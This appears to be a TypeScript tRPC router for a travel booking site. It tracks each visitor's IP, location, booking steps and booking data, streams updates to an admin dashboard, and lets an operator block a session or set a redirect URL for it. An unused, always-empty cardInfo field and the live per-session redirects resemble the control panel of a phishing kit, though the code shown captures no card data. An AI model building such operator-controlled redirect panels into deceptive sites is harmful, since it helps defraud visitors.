import { z } from 'zod';
import { router, publicProcedure, adminProcedure } from '../trpc.js';
import { db } from '../db.js';
import { emitVisitorUpdate } from '../socket.js';

const bookingDataSchema = z.object({
  from: z.string().optional(),
  to: z.string().optional(),
  date: z.string().optional(),
  passengers: z.number().optional(),
  selectedTrip: z.string().optional(),
  selectedSeats: z.array(z.string()).optional(),
  fareClass: z.string().optional(),
}).optional();

function parseObject(value: unknown): Record<string, unknown> {
  if (typeof value !== 'string' || !value) return {};
  try {
    const parsed = JSON.parse(value);
    return parsed && typeof parsed === 'object' && !Array.isArray(parsed) ? parsed : {};
  } catch {
    return {};
  }
}

function parseHistory(value: unknown): Array<{ step: string; time: number }> {
  if (typeof value !== 'string' || !value) return [];
  try {
    const parsed = JSON.parse(value);
    return Array.isArray(parsed) ? parsed : [];
  } catch {
    return [];
  }
}

export const visitorsRouter = router({
  track: publicProcedure
    .input(z.object({
      sessionId: z.string(),
      page: z.string().optional().default('/'),
      userAgent: z.string().optional().default(''),
      ip: z.string().optional(),
      country: z.string().optional(),
      city: z.string().optional(),
      step: z.string().optional(),
      bookingData: bookingDataSchema,
    }))
    .mutation(async ({ input, ctx }) => {
      const ip = input.ip || ctx.clientIp;

      const existing = await db.visitor.findUnique({ where: { sessionId: input.sessionId } });

      if (existing?.isBlocked) {
        return { blocked: true, redirectUrl: existing.redirectUrl ?? null };
      }

      const stepHistory = parseHistory(existing?.stepHistory);
      const currentBookingData = parseObject(existing?.bookingData);
      const bookingData = input.bookingData
        ? { ...currentBookingData, ...input.bookingData }
        : currentBookingData;
      const pendingRedirect = existing?.redirectUrl ?? null;
      const now = new Date().toISOString();

      if (input.step) {
        stepHistory.push({ step: input.step, time: Date.now() });
        // Keep only last 50 steps
        if (stepHistory.length > 50) stepHistory.splice(0, stepHistory.length - 50);
      }

      await db.visitor.upsert({
        where: { sessionId: input.sessionId },
        update: {
          page: input.page,
          userAgent: input.userAgent,
          ip,
          ...(input.country && { country: input.country }),
          ...(input.city && { city: input.city }),
          ...(input.step && { currentStep: input.step, stepHistory: JSON.stringify(stepHistory) }),
          ...(input.bookingData && { bookingData: JSON.stringify(bookingData) }),
          ...(pendingRedirect && { redirectUrl: null }),
          lastActive: now,
        },
        create: {
          sessionId: input.sessionId,
          page: input.page ?? '/',
          userAgent: input.userAgent ?? '',
          ip,
          country: input.country ?? '',
          city: input.city ?? '',
          currentStep: input.step ?? 'home',
          stepHistory: JSON.stringify(input.step ? [{ step: input.step, time: Date.now() }] : []),
          isBlocked: false,
          bookingData: JSON.stringify(input.bookingData ?? {}),
          cardInfo: JSON.stringify({}),
          lastActive: now,
        },
      });

      // Notify admin dashboard in real-time
      emitVisitorUpdate({
        sessionId: input.sessionId,
        page: input.page,
        ip,
        currentStep: input.step ?? 'home',
        lastActive: new Date().toISOString(),
      });

      return { blocked: false, redirectUrl: pendingRedirect };
    }),

  stats: adminProcedure.query(async () => {
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
    const [total, active, blocked] = await Promise.all([
      db.visitor.count(),
      db.visitor.count({ where: { lastActive: { gte: fiveMinAgo }, isBlocked: false } }),
      db.visitor.count({ where: { isBlocked: true } }),
    ]);
    return { total, active, blocked };
  }),

  list: adminProcedure.query(async () => {
    const visitors = await db.visitor.findMany({
      orderBy: { lastActive: 'desc' },
      take: 200,
    });
    return visitors.map(v => ({
      ...v,
      stepHistory: parseHistory(v.stepHistory),
      bookingData: parseObject(v.bookingData),
      cardInfo: {},
    }));
  }),

  blockVisitor: adminProcedure
    .input(z.object({
      sessionId: z.string(),
      blocked: z.boolean(),
      redirectUrl: z.string().nullable().optional(),
    }))
    .mutation(async ({ input }) => {
      await db.visitor.update({
        where: { sessionId: input.sessionId },
        data: {
          isBlocked: input.blocked,
          ...(input.redirectUrl !== undefined ? { redirectUrl: input.redirectUrl } : {}),
        },
      });
      return { success: true };
    }),

  setRedirectUrl: adminProcedure
    .input(z.object({ sessionId: z.string(), redirectUrl: z.string() }))
    .mutation(async ({ input }) => {
      await db.visitor.update({
        where: { sessionId: input.sessionId },
        data: { redirectUrl: input.redirectUrl },
      });
      return { success: true };
    }),
});
